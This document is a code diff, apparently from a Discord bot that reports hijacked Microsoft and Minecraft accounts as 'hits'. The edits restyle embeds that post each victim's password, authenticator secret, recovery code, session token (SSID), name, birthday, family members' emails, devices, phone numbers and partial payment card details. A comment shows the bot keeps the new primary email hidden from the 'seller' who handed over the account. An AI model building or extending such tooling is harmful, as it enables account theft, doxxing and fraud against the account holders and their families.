@@ -129,14 +129,14 @@ def build_failure_embed(
                 "the original Outlook alias was removed and will not work."
             )
         embed = Embed(
-            title="Account returned — save new credentials",
+            title="Account returned",
             description=desc,
-            color=0xFA4343,
+            color=0x57F287,
         )
     else:
         embed = Embed(
-            title="[x] secure failed account",
-            description=reason,
+            title="Secure failed",
+            description=f"```{reason[:300]}```",
             color=0xFA4343,
         )
     # Never dump RuntimeError / HTML into Discord. Skip Error when it duplicates.
@@ -144,7 +144,7 @@ def build_failure_embed(
         embed.add_field(name="Error", value=f"```{detail[:280]}```", inline=False)
     embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
     embed.add_field(
-        name="Login Email (primary)",
+        name="Login Email",
         value=f"```{login_email}```",
         inline=True,
     )
@@ -212,67 +212,92 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
 
     all_subs = active_subs + canceled_subs + commercial_subs
 
-    info_embed = Embed(title="Extra Info", color=0x5865F2)
-    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
-    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
+    info_embed = Embed(
+        title="Account Info",
+        description=f"**{ms['fullName']}** · {ms['region']}",
+        color=0x5865F2,
+    )
+    info_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/64")
+    info_embed.add_field(name="Name", value=f"```{ms['firstName']}```", inline=True)
+    info_embed.add_field(name="Surname", value=f"```{ms['lastName']}```", inline=True)
     info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
     info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
     info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
     info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)
 
-    family_embed = Embed(title=f"Family Members ({len(family)})", color=0x5865F2)
+    family_embed = Embed(
+        title=f"Family Members ({len(family)})",
+        color=0x9B59B6,
+    )
     if family:
         for key, member in enumerate(family, 1):
+            role = _field(member, "role")
             family_embed.add_field(
-                name=f"Member {key}", 
-                value=f"```{_field(member, 'display', 'name')}\n{_field(member, 'email')}\nRole: {_field(member, 'role')}```", 
-                inline=True
+                name=f"Member #{key}",
+                value=f"```{role}\n{_field(member, 'display', 'name')}\n{_field(member, 'email')}```",
+                inline=True,
             )
     else:
         family_embed.description = "This account doesn't belong to a family."
 
 
-    devices_embed = Embed(title=f"Devices ({len(devices)})", color=0x5865F2)
+    devices_embed = Embed(
+        title=f"Devices ({len(devices)})",
+        color=0x1ABC9C,
+    )
     if devices:
         for key, device in enumerate(devices, 1):
             devices_embed.add_field(
-                name=f"Device {key}", 
-                value=f"```{_field(device, 'model')}\n{_field(device, 'name')}```",
-                inline=True
+                name=f"Device #{key}",
+                value=f"```{_field(device, 'model')}```\n**Name:** {_field(device, 'name')}",
+                inline=True,
             )
     else:
         devices_embed.description = "```There are no devices connected.```"
 
     # List all cards
-    cards_embed = Embed(title=f"Payment Cards ({len(cards)})", color=0x5865F2)
+    cards_embed = Embed(
+        title=f"Payment Cards ({len(cards)})",
+        color=0xF1C40F,
+    )
     if cards:
         for key, card in enumerate(cards, 1):
             cards_embed.add_field(
-                name=f"Card {key}",
-                value=f"```{_field(card, 'paymentMethodType')} *{_field(card, 'lastFourDigits', default='????')}\nExpiry: {_field(card, 'expirationDate', default='N/A')}```",
-                inline=True
+                name=f"Card #{key}",
+                value=(
+                    f"**Type:** {_field(card, 'paymentMethodType')}\n"
+                    f"****{_field(card, 'lastFourDigits', default='????')}**\n"
+                    f"**Expiry:** {_field(card, 'expirationDate', default='N/A')}"
+                ),
+                inline=True,
             )
     else:
         cards_embed.description = "```No payment cards.```"
 
-    phones_embed = Embed(title=f"Phones ({len(phones)})", color=0x5865F2)
+    phones_embed = Embed(
+        title=f"Phones ({len(phones)})",
+        color=0xE67E22,
+    )
     if phones:
         for key, phone in enumerate(phones, 1):
             phones_embed.add_field(
-                name=f"Phone {key}",
-                value=f"```{_field(phone, 'phone')}\n{_field(phone, 'id')}```",
-                inline=True
+                name=f"Phone #{key}",
+                value=f"```{_field(phone, 'phone')}```\nID: `{_field(phone, 'id')}`",
+                inline=True,
             )
     else:
         phones_embed.description = "```No phones associated.```"
 
-    subscriptions_embed = Embed(title=f"Subscriptions ({len(all_subs)})", color=0x5865F2)
+    subscriptions_embed = Embed(
+        title=f"Subscriptions ({len(all_subs)})",
+        color=0x9B59B6,
+    )
     if all_subs:
         for key, (sub, status) in enumerate(all_subs, 1):
             subscriptions_embed.add_field(
-                name=f"Sub {key}",
+                name=f"Sub #{key}",
                 value=f"```{status}\n{_field(sub, 'productName', 'title', 'name', 'offerName', 'productTitle', 'friendlyName')}```",
-                inline=True
+                inline=True,
             )
     else:
         subscriptions_embed.description = "```No subscriptions.```"
@@ -288,13 +313,17 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     except Exception:
         dstats = "Failed"
 
-    stats_embed = Embed(color=0x279CF5)
-    stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
-    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats.get("hypixel", {}).get("level", 0))}', inline=True)
-    stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
-    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
-    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
-    stats_embed.add_field(name="Donut NW", value=f'{simplify(fetch_donut_money(dstats))}', inline=True)
+    stats_embed = Embed(
+        title=f"Stats — {name}",
+        color=0x279CF5,
+    )
+    stats_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/64")
+    stats_embed.add_field(name="Rank", value=f"```{hstats.get('hypixel', {}).get('rank', 'N/A')}```", inline=True)
+    stats_embed.add_field(name="Hyp LVL", value=f"```{simplify(hstats.get('hypixel', {}).get('level', 0))}```", inline=True)
+    stats_embed.add_field(name="Gifted", value=f"```{hstats.get('hypixel', {}).get('gifted', 0)}```", inline=True)
+    stats_embed.add_field(name="SB NW", value=f"```${simplify(hstats.get('skyblock', {}).get('networth', 0))}```", inline=True)
+    stats_embed.add_field(name="SB LVL", value=f"```{simplify(hstats.get('skyblock', {}).get('level', 0))}```", inline=True)
+    stats_embed.add_field(name="Donut NW", value=f"```{simplify(fetch_donut_money(dstats))}```", inline=True)
 
     xbox_embed = Embed(color=0x107C10, title="Xbox Info")
     xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)
@@ -302,17 +331,20 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     hit_eb = Embed(
         title=f"New Hit! Secured in {round(elapsed, 2)}s",
         description=(
-            "[Login](https://login.live.com/) | "
-            "[Donut](https://www.donutstats.net/player-finder) | "
-            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
-            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
+            "[Login](https://login.live.com/) · "
+            "[Donut](https://www.donutstats.net/player-finder) · "
+            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) · "
+            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) · "
             f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
         ),
-        color=0x279CF5
+        color=0x279CF5,
     )
-    hit_eb.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
-    hit_eb.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
-    hit_eb.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
+    hit_eb.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/64")
+    hit_eb.add_field(
+        name="Minecraft",
+        value=f"```Name:  {mc.get('name', 'No Minecraft')}\nMethod: {mc.get('method', 'Unknown')}\nCapes:  {mc.get('capes', 'No capes')}```",
+        inline=False,
+    )
     old_email = _clean(
         ms.get("orig_email") or ms.get("seller_email") or "",
         fallback="",
@@ -331,7 +363,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         )
     hit_eb.add_field(name="Security Email", value=f"```{ms['sec_mail']}```", inline=False)
     hit_eb.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
-    hit_eb.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
+    hit_eb.add_field(name="Authenticator", value=f"```{ms['auth_secret']}```", inline=False)
     hit_eb.add_field(name="Recovery Code", value=f"```{ms['rec_code']}```", inline=False)
     add_credential_line_field(
         hit_eb,
@@ -347,7 +379,9 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
             value=f"```{old_email} → {new_email}```",
             inline=False,
         )
-    hit_eb.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
+    hit_eb.set_footer(
+        text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}"
+    )
 
     # Seller-facing embed: NEVER expose the post-secure primary (sunny@…).
     # Use original login email only; owners still get hit_eb above.
@@ -361,11 +395,11 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     if ms.get("orig_email"):
         seller_email = ms["orig_email"]
     sell_eb = Embed(
-        title="Account secured",
+        title="Account Secured",
         description="Your sale completed. Save the security details below if this was returned to you.",
         color=0x57F287,
     )
-    sell_eb.add_field(name="Email", value=f"```{seller_email}```", inline=False)
+    sell_eb.add_field(name="Login Email", value=f"```{seller_email}```", inline=False)
     sell_eb.add_field(name="Security Email", value=f"```{ms.get('sec_mail', 'N/A')}```", inline=True)
     sell_eb.add_field(name="Password", value=f"```{ms.get('password', 'N/A')}```", inline=True)
     sell_eb.add_field(name="Recovery Code", value=f"```{ms.get('rec_code', 'N/A')}```", inline=False)
@@ -379,7 +413,8 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     )
 
     ssid_embed = Embed(
-        title="SSID"
+        title="SSID",
+        color=0x9B59B6,
     )
     if mc.get("SSID"):
         ssid_embed.description = f"```{mc['SSID']}```"
